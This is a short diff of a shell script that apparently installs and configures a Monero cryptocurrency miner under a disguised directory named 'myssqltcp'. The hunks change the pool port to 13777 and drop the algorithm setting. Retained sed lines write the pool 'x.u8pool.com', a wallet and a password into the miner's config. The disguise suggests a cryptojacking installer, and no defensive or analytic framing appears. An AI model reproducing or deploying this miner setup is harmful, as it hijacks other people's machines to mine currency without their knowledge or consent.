@@ -106,13 +106,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 13555 ))
+PORT=$(( 13777 ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
+if [ "$PORT" -lt "13777" -o "$PORT" -gt "13777" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -788,7 +788,6 @@ if [ ! -z $EMAIL ]; then
   PASS="$EMAIL"
 fi
 
-sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
